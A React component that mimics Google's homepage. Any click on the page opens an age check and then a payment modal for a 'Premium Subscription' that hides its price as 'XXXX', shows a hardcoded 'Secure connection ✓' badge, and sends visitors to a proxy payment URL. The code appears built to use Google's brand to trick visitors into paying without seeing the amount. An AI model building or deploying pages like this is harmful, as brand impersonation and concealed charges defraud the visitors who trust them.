import React, { useState } from 'react';
import { Search, Mic, Camera, Grid, User, X, CreditCard } from 'lucide-react';

function App() {
  const [searchQuery, setSearchQuery] = useState('');
  const [showAgeVerification, setShowAgeVerification] = useState(false);
  const [showPayment, setShowPayment] = useState(false);
  const [priceHidden, setPriceHidden] = useState(true);

  const handlePageClick = (e: React.MouseEvent) => {
    if (
      e.target instanceof HTMLElement &&
      !e.target.closest('.modal-content') &&
      !showAgeVerification &&
      !showPayment
    ) {
      setShowAgeVerification(true);
    }
  };

  const handleAgeVerification = (isAdult: boolean) => {
    if (isAdult) {
      setShowAgeVerification(false);
      setShowPayment(true);
    } else {
      alert('You must be 18 or older to continue.');
    }
  };

  // Используем продакшен URL (например, https://my-app.example.com/proxy-payzaty)
const openPayzaty = () => {
  window.open(
    'https://my-backend.onrender.com/proxy-payzaty', 
    '_blank', 
    'noopener,noreferrer'
  );
};

  return (
    <div className="min-h-screen bg-[#202124] text-gray-200" onClick={handlePageClick}>
      {/* Age Verification Modal */}
      {showAgeVerification && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="modal-content bg-[#303134] p-8 rounded-xl shadow-2xl max-w-md w-full mx-4">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-semibold text-white">Age Verification</h2>
              <button onClick={() => setShowAgeVerification(false)} className="text-gray-400 hover:text-white">
                <X className="w-6 h-6" />
              </button>
            </div>
            <div className="space-y-4">
              <p className="text-gray-300 mb-6">Are you 18 years or older?</p>
              <div className="flex space-x-4">
                <button
                  onClick={() => handleAgeVerification(true)}
                  className="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg transition-colors"
                >
                  Yes
                </button>
                <button
                  onClick={() => handleAgeVerification(false)}
                  className="flex-1 bg-gray-600 hover:bg-gray-700 text-white py-3 rounded-lg transition-colors"
                >
                  No
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Payment Modal */}
      {showPayment && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="modal-content bg-[#303134] p-6 rounded-xl shadow-2xl max-w-md w-full mx-4">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-semibold text-white">Payment</h2>
              <button onClick={() => setShowPayment(false)} className="text-gray-400 hover:text-white">
                <X className="w-6 h-6" />
              </button>
            </div>
            <div className="space-y-6">
              <div className="bg-[#3c4043] p-4 rounded-lg relative">
                <h3 className="text-lg font-medium mb-3">Order Summary</h3>
                <div className="flex justify-between mb-2">
                  <span>Product:</span>
                  <span>Premium Subscription</span>
                </div>
                <div className="flex justify-between items-center">
                  <span>Amount:</span>
                  <div
                    className={`font-bold ${priceHidden ? 'text-transparent bg-gray-600 rounded px-2' : ''}`}
                    onClick={() => setPriceHidden(!priceHidden)}
                  >
                    {priceHidden ? 'XXXX' : '$49.99'}
                  </div>
                </div>
              </div>
              <div className="text-center text-gray-300 text-sm">
                <p>You will be redirected to secure payment page</p>
              </div>
              <button onClick={openPayzaty}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg transition-colors flex items-center justify-center">
                <CreditCard className="w-5 h-5 mr-2" />
                Proceed to Payment
              </button>
              <div className="text-center text-gray-400 text-xs mt-4">
                <p>Secure connection <span className="text-green-400">✓</span></p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <header className="flex justify-end items-center p-4 space-x-4">
        <a href="#" className="hover:text-white transition-colors">Gmail</a>
        <a href="#" className="hover:text-white transition-colors">Images</a>
        <button className="p-2 hover:bg-gray-700 rounded-full transition-colors">
          <Grid className="w-5 h-5" />
        </button>
        <button className="w-8 h-8 rounded-full bg-purple-500 flex items-center justify-center">
          <User className="w-5 h-5" />
        </button>
      </header>

      {/* Main Content */}
      <main className="flex flex-col items-center justify-center h-[calc(100vh-140px)]">
        <div className="mb-8">
          <h1 className="text-6xl font-normal text-white tracking-tight">
            Google
          </h1>
        </div>
        <div className="w-full max-w-2xl mx-auto">
          <div className="relative">
            <div className="flex items-center bg-[#303134] rounded-full p-4 hover:bg-[#3c4043] transition-colors shadow-lg border border-gray-700">
              <Search className="w-5 h-5 text-gray-400 mr-3" />
              <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)}
                     className="flex-1 bg-transparent outline-none text-white placeholder-gray-400"
                     placeholder="Search Google or type a URL" />
              <div className="flex items-center space-x-3">
                <button className="p-2 hover:bg-gray-600 rounded-full transition-colors">
                  <Camera className="w-5 h-5 text-blue-400" />
                </button>
                <button className="p-2 hover:bg-gray-600 rounded-full transition-colors">
                  <Mic className="w-5 h-5 text-blue-400" />
                </button>
              </div>
            </div>
            <div className="flex justify-center mt-8 space-x-4">
              <button className="px-6 py-2 bg-[#303134] hover:bg-[#3c4043] rounded-lg transition-colors">
                Google Search
              </button>
              <button className="px-6 py-2 bg-[#303134] hover:bg-[#3c4043] rounded-lg transition-colors">
                I'm Feeling Lucky
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="absolute bottom-0 w-full bg-[#171717] text-sm">
        <div className="px-6 py-3 border-b border-gray-700">
          <span className="text-gray-400">United States</span>
        </div>
        <div className="px-6 py-3 flex justify-between items-center">
          <div className="flex space-x-6">
            <a href="#" className="text-gray-400 hover:text-gray-200">About</a>
            <a href="#" className="text-gray-400 hover:text-gray-200">Advertising</a>
            <a href="#" className="text-gray-400 hover:text-gray-200">Business</a>
            <a href="#" className="text-gray-400 hover:text-gray-200">How Search works</a>
          </div>
          <div className="flex space-x-6">
            <a href="#" className="text-gray-400 hover:text-gray-200">Privacy</a>
            <a href="#" className="text-gray-400 hover:text-gray-200">Terms</a>
            <a href="#" className="text-gray-400 hover:text-gray-200">Settings</a>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;
